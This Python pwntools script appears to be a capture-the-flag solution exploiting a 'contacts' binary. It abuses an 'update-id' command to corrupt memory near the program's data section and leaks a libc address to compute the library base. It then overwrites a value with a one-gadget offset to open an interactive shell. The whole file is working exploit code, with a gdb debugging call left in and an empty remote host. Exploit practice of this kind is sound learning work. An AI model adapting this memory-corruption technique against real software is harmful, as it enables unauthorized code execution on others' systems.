from pwn import *

e = ELF("./contacts")
libc = ELF("./libc.so.6")

if "--remote" in sys.argv:
  p = remote("", 0)
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path})

def alloc(idx, name):
  p.sendlineafter("$", "add {} {} 1111111111111".format(idx, name))
  p.recvuntil("Successfully added.")

def reidx(name, idx):
  p.sendlineafter("$", "update-id {} {}".format(name, idx))

def free(idx):
  p.clean()

for i in range(0x40):
  alloc(1000 + i, "BUFFER" + str(i))

alloc(1, "A") 
alloc(1, "B") 
alloc(0, "C")

reidx("C", e.symbols["data"] + 0x1000 - 0x10)

alloc(10000, "BUFFERRRR")

gdb.attach(p)
fake_username = "L" * 0x18
alloc(10001, fake_username)

p.sendlineafter("$", "get 10001")
p.recvuntil(fake_username)

libc_leak = p.recvuntil(" 1111111111", drop=True)
libc_base = -0x1000 & u64(libc_leak.ljust(8, "\x00"))
print("{:#x}".format(libc_base))

p.sendlineafter("$", "update-id {} {}".format(fake_username, libc_base + 0x4526a))
p.sendlineafter("$", "quit")

p.interactive()
